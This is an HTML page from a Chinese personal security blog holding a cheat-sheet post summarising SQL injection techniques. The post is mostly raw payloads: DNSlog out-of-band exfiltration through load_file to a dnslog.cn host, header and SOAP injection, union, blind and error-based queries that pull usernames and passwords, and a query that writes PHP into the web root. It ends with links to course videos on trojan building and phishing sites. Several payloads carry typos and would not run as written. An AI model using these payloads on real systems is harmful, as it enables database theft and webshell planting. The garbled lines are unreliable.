@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>SQL注入-总结 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,Metasploit," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>SQL注入-总结</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-07-25
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="23SQL注入-总结"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="SQL注入-总结"><a href="#SQL注入-总结" class="headerlink" title="SQL注入-总结"></a>SQL注入-总结</h2><p>只要输入的特定语句，被网站执行，就说明网站存在注入漏洞</p>
+<h3 id="一、-DNSlog注入"><a href="#一、-DNSlog注入" class="headerlink" title="一、 DNSlog注入"></a>一、 DNSlog注入</h3><p>oob  out of band 数据带外</p>
+<p>核心：将盲注内容转化为显示错误，oob在sql注入中的应用</p>
+<p>适用场景：<br>    某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这是可以通过DNSlog注入把想获得的数据外带出来；<br>    将select的数据发送一个url，利用dns解析产生的记录日志来查看数据</p>
+<p>dnslog网址 <a target="_blank" rel="noopener" href="http://dnslog.cn/">dnslog</a><br>ceye网址 <a target="_blank" rel="noopener" href="http://ceye.io/">ceye</a></p>
+<ol>
+<li><p>通过 Get SubDomain 获取一个 dns 地址</p>
+</li>
+<li><p>点击 Refresh Record 确认没有访问日志</p>
+</li>
+<li><p>进行盲注</p>
+</li>
+</ol>
+<p>内容.nm1kaa.dnslog.cn</p>
+<p>select concat((select database()), ‘.cy1nlz.dnslog.cn’)</p>
+<ol start="4">
+<li>查看日志 load_file()</li>
+</ol>
+<p>读取文件<br>select load_file(CONCAT(‘//‘, (select database()), ‘.cy1nlz.dnslog.cn/1.txt’))</p>
+<p>select load_file(CONCAT(‘//‘, (select group_concat(table_name) from information_schema.tables where table_schema=dnslog and table_name like ‘%flag%’), ‘.cy1nlz.dnslog.cn/1.txt’))</p>
+<p>1%20and%20id%20in(select load_file(CONCAT(‘//‘, (), ‘.0u0y7y.dnslog.cn/1.txt’)))%20–+</p>
+<h3 id="head注入"><a href="#head注入" class="headerlink" title="head注入"></a>head注入</h3><p>head多数都需要用户成功登录网站的，网站有时会记录一些head信息，存入数据库，可能会存在head注入</p>
+<p>报错注入</p>
+<p>‘ or udpatexml(1, concat(0x7e, (seelct version() ) ), 1), 1) –+<br>udpatexml 能够将数据库语句执行，并且伴随着数据库报错显示出来</p>
+<p>user-agent<br>refere<br>X-Forwarded-for</p>
+<h3 id="soap注入"><a href="#soap注入" class="headerlink" title="soap注入"></a>soap注入</h3><p>soap注入就是在webservice的soap协议，连接web服务和客户端的接口处的注入，通过在发送的soap消息参数内添加注入语句来达到注入效果，常见的有sql注入，也有xml注入，代码注入</p>
+<p>什么是soap</p>
+<p>首先介绍webservice，webservice是一种跨平台，跨语言的规范，用于不同平台，不同语言间的交互</p>
+<p>webservice三要素,分别为soap,wsdl和uddl</p>
+<ol>
+<li>soap是简单对象访问协议，用于分布式环境的基于信息交换的同行协议，描述传递信息的格式和规范，它可以用于连接web服务和客户端之间的接口，是一个可以在不同操作系统上运行的不同语言编写的程序之间的传输通信协议，格式为xml，soap消息</li>
+</ol>
+<p>soap协议又分为soap 1.1 和 soap 1.2 两个版本<br>这两个协议间的区别在于soap 1.1里存在soapAction请求头，而soap 1.2没有，soap 1.2里用了action来代替，两者的wsdl文件也不同，体现在命名空间和定义service差别里，不过这些对注入没有影响</p>
+<ol start="2">
+<li>wsdl是webservice服务描述语言，用于web服务说明，它是一个xml文档，用于说明一组soap消息如何访问接口</li>
+<li>uddl用于提供发布和查询webservice方法</li>
+</ol>
+<p>注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;soap:Envelope xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">&lt;soap:Header&gt;</span><br><span class="line">&lt;&#x2F;soap:Header&gt;</span><br><span class="line">&lt;soap:Body&gt;</span><br><span class="line">    &lt;GetServiceCustomer xmlns&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;</span><br><span class="line">        &lt;UserID&gt;string&lt;&#x2F;UserID&gt;</span><br><span class="line">        &lt;ServiceType&gt;string&lt;&#x2F;ServiceType&gt;</span><br><span class="line">        &lt;CO_CODE&gt;string&lt;&#x2F;CO_CODE&gt;</span><br><span class="line">    &lt;&#x2F;GetServiceCustomer&gt;</span><br><span class="line">    &lt;soap:Fault&gt;</span><br><span class="line">    &lt;&#x2F;soap:Fault&gt;</span><br><span class="line">&lt;&#x2F;soap:Body&gt;</span><br><span class="line">&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Envelope:用于把xml信息标记为soap<br>header：包含请求信息<br>Body:包含了请求和相应信息<br>Fault：包含了发生的错误信息<br>重点关注Body，Body处包含了请求和相应信息，当Body内有存在数据可控时，就有可能存在注入</p>
+<p>如果这里的UserID处的参数被放入数据库查询，就有可能触发漏洞，当然，这里需要知道此处web服务的功能，sql注入一般发生在数据查询处<br>或者可以去通过查看asmx下的wsdl，wsdl是一个xml，用于说明soap消息及如何使用这些消息，通常形式为asmx?wsdl,后面测试里会提到的</p>
+<p>查找SOAP注入<br>通常而言通过搜索特定后缀去找webservice地址，比如通过在fofa搜索 asmx，asmx是webservice服务程序的后缀名，<a target="_blank" rel="noopener" href="http://asp.net/">http://asp.net</a> 使用 asmx 来进行对webservice的支持，通过fofa上搜索找目标，或者可以使用google语法搜索，inurl:asmx?wsdl，inurl:.php?wsdl inurl:.ashx?wsdl通过去查找webservice的服务描述的xml文档来找寻可能的注入点</p>
+<p>进阶<br>因为wsdl内的信息过于繁杂，可以借助辅助工具来对wsdl进行分析，常用的有soapui,或者用burp的wsdler模块，都可以分析wsdl来得到</p>
+<p>soapui使用<br>点击file，选择create new project,填入地址,然后就可以对wsdl地址进行解析</p>
+<p>burp<br>抓取访问wsdl的数据包，然后右键，选择parse wsdl<br>得到分析结果，这里可以结合sqlmap使用，把抓到的包保存为txt文件，然后sqlmap去测试</p>
+<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><ol>
+<li>判断是否存在注入，注入是字符型还是数字型；</li>
+<li>猜解SQL查询语句中的字段数；</li>
+<li>判断回显点；</li>
+<li>获取当前数据库；</li>
+<li>获取当前数据库的表名；</li>
+<li>获取表中的字段数；</li>
+<li>下载/获取字段或者列的具体数据；</li>
+</ol>
+<p>万能密码<br>‘ or 2=1 –+</p>
+<p>查找注入点<br>id=1 and 1=1<br>id=1’ and ‘1’=’1<br>1’ and ‘1’=’2</p>
+<p>查询字段数<br>id=1 order by 3<br>id=1’ order by 3</p>
+<p>确定当前数据库名<br>id=1’ union select 1,database()<br>id=1’ union select version(),database()</p>
+<p>确定表名 separator<br>id=1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()<br>id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
+<p>确定列名<br>id=1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’<br>id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’<br>id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273</p>
+<p>确定列的详细信息<br>id=1 union select group_concat(user), group_concat(password) from users<br>id=1 union select user, password from users<br>id=1’ union select user,password from users</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>类型：布尔盲注 时间盲注</p>
+<p>有的页面没有回显点，只有数据显示，这种情况就要进行盲注</p>
+<p>返回字符、字段长度<br>length(‘’)</p>
+<p>猜解数据库名的长度<br>1’ and length(database())=1</p>
+<p>猜解数据库的名<br>substr(‘’, 1, 1) 在字符、字段中 从第1个位置 截取1个字符<br>1’ and ascii(substr(database(),1,1))&gt;97</p>
+<p>猜解数据库的表名：-&gt;库中表的数量-&gt;表名的长度-&gt;表的名称；<br>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=1<br>1’ and length(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1))=1<br>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1))&gt;97</p>
+<p>猜解表中的字段数：-&gt;表中字段的数量-&gt;字段的长度-&gt;字段的名称；<br>1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=1#<br>1’ and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=1<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))&gt;97</p>
+<p>猜解字段内具体的数据信息，如用户名和密码：猜解列内对象的个数-&gt;每个对象的长度-&gt;每个对象的名字；<br>1’ and (select count(user) from users)=1<br>1’ and length(substr((select user from users limit 0,1),1))=1<br>1’ and (ascii(substr((select user from users limit 0,1),1,1)))=97</p>
+<h4 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h4><p>判断是否存在注入，注入是字符型还是数字型；<br>1’ and sleep(5)</p>
+<p>猜解当前数据库名：-&gt;猜解数据库名的长度-&gt;猜解数据库的名；<br>1’ and if(length(database())=1,sleep(5),1)<br>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)</p>
+<p>猜解数据库的表名：-&gt;库中表的数量-&gt;表名的长度-&gt;表的名称；<br>1’ and if((select count(table_name) from information_schema.tables where table_schema=’dvwa’)=1,sleep(5),1)<br>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1))=1,sleep(5),1)<br>1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1))&gt;97,sleep(5),1)</p>
+<p>猜解表中的字段数：-&gt;表中字段的数量-&gt;字段的长度-&gt;字段的名称；<br>1’ and if((select count(column_name) from information_schema.columns where table_name=’users’)=1,sleep(5),1)<br>1’ and if(length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=1,sleep(5),1)<br>1’ and if(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))&gt;97,sleep(5),1)</p>
+<p>猜解字段内具体的数据信息，如用户名和密码：猜解列内对象的个数-&gt;每个对象的长度-&gt;每个对象的名字；<br>1’ and if((select count(user) from users)=1,sleep(5))<br>1’ and if(length(substr((select user from users limit 0,1),1))=1,sleep(5))<br>1’ and if((ascii(substr((select user from users limit 0,1),1,1)))=97,sleep(5),1)</p>
+<p>—盲注–left函数————————————<br>判断是否存在注入，注入是字符型还是数字型；<br>1’ and ‘1’=’2</p>
+<p>猜解当前数据库名：-&gt;猜解数据库名的长度-&gt;猜解数据库的名；<br>（#可以用%23代替，或者–+；’可用%27代替；）<br>1’ and length(database())=1–+<br>1’ and left(database(),1)&gt;’a’–+<br>1’ and left(database(),1)&gt;’a’%23</p>
+<p>猜解数据库的表名：-&gt;库中表的数量-&gt;表名的长度-&gt;表的名称；<br>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=1–+<br>1’ and length((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1))=1–+<br>1’ and left((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1)&gt;’a’–+</p>
+<p>猜解表中的字段数：-&gt;表中字段的数量-&gt;字段的长度-&gt;字段的名称；<br>1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=1–+<br>1’ and length((select column_name from information_schema.columns where table_name=’users’ limit 0,1))=1–+<br>1’ and left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1)&gt;’a’–+</p>
+<p>猜解字段内具体的数据信息，如用户名和密码：猜解列内对象的个数-&gt;每个对象的长度-&gt;每个对象的名字；<br>1’ and (select count(user) from users)=1–+<br>1’ and length((select user from users limit 0,1))=1–+<br>1’ and left((select user from users limit 0,1),1)&gt;’a’–+</p>
+<p>—报错型注入—————————————–<br>#查库<br>select</p>
+<p>—floor(rand(0))报错—————————<br>从当前数据库查询第一个表名（该类型报错查询不查询数据库名）；<br>1’ union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))a from information_schema.tables group by a%23</p>
+<p>从当前数据库查询第一个列名；<br>1’ union select count(*),1,concat((select column_name from information_schema.columns where table_name=’users’ limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</p>
+<p>查询列的数据；<br>1’ union select count(*),1,concat((select username from users limit 0,1),floor(rand(0)*2))a from users group by a%23</p>
+<p>—exp报错—————————————-<br>从当前数据库查询第一个表名（该类型报错查询不查询数据库名）；<br>1’ union select exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)),2,3%23</p>
+<p>从当前数据库查询第一个列名；<br>1’ union select exp(~(select * from (select column_name from information_schema.columns where table_name=’users’ limit 0,1)a)),2,3%23</p>
+<p>查询列的数据；<br>1’ union select exp(~(select * from (select username from users limit 0,1)a)),2,3%23</p>
+<p>—xpath报错———————————-<br>–updatexml函数—————–<br>1” and updatexml(1,concat(0x7e,(select @@version),0x7e),1)%23</p>
+<p>–extractvalue函数———————–<br>1” and extractvalue(1,concat(0x7e,(select @@version),0x7e))%23</p>
+<p>查询所有数据库<br>1” and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_ schema.schemata),0x7e))%23</p>
+<p>查询所有列<br>1” and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema. tables where table_schema=”security”),0x7e))%23</p>
+<p>—bigint报错————————————-<br>1” union select(!(select * from (select user())x) -~0),2,3%23</p>
+<p>#查询所有数据库<br>1” union select(!(select * from (select group_concat(schema_name) from information_schema.schemata limit 0,1)x) -~0),2,3%23</p>
+<p>查询所有表<br>1” union select(!(select * from (select group_concat(table_name) from information_schema. tables where table_schema=”security”)x) -~0),2,3%23</p>
+<p>查询所有列<br>1” union select(!(select * from (select group_concat(column_name) from information_schema. columns where table_name=”users”)x) -~0),2,3%23</p>
+<p>—SQL读、写文件——————————————–<br>1’ union select 1,2,3 into file “/var/www/html/a.txt”#<br>1’ union select 1,’<?php phpinfo();?>‘,3 into file “/var/www/html/a.txt”#</p>
+<p>-1’ union select 1,load file(“/var/www/html/a.txt”),3#</p>
+<p>2021年-Kali安全渗透+Web白帽子高级工程师+黑客攻防-基础VIP课程<br><a target="_blank" rel="noopener" href="https://ke.qq.com/course/1583231?taid=7368664937932927&amp;tuin=6a07dc75">https://ke.qq.com/course/1583231?taid=7368664937932927&amp;tuin=6a07dc75</a><br>有一些基础，可以看一下下面的视频资料<br>1、实战：搭建蜜罐系统捕捉黑客操作的步骤<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NdkqrqPAGz3EY9IouEoZ_g">https://pan.baidu.com/s/1NdkqrqPAGz3EY9IouEoZ_g</a> 提取码: smui<br>2、实战-揭密克隆网站和钓鱼网站背后的技术<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1piyXcUKEtq9WtdVUi5b3PA">https://pan.baidu.com/s/1piyXcUKEtq9WtdVUi5b3PA</a> 提取码：huz3<br>3、实战-使用SQLmap进行sql注入并获得后台管理员adnim帐号和密码<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/10O0JLCwm7NNRIxpMnLfG-Q">https://pan.baidu.com/s/10O0JLCwm7NNRIxpMnLfG-Q</a> 提取码：91sk<br>4、实战：使用msfvenom生成快播和西瓜影音看片神器后门木马<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GyFF3o0N0kSThYbsjNp6nA">https://pan.baidu.com/s/1GyFF3o0N0kSThYbsjNp6nA</a> 提取码：2hlf</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/23SQL%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/Metasploit/">
+              #Metasploit
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/24XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80/" target="_self">XSS跨站脚本攻击基础</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/26CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_self">CSRF跨站请求伪造</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
